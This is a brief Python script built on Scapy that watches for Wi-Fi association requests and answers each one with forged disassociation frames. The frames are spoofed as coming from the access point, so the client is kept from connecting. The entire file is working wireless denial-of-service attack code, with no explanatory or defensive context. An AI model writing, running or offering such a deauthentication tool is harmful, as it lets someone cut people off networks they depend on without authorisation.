from scapy.all import *

IFACE = "wlx503eaa666aab"
COUNT = 5


def callback(pkt):
    Attack(pkt[Dot11].addr1, pkt[Dot11].addr2)


def Attack(bssid, client):
    print(f"Blocking {client} from connecting to {bssid}...")
    dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Disas(reason=1)
    sendp(frame, iface=IFACE, count=COUNT, inter=0.100)


sniff(iface=IFACE, prn=callback, filter="type mgt subtype assoc-req", store=0)
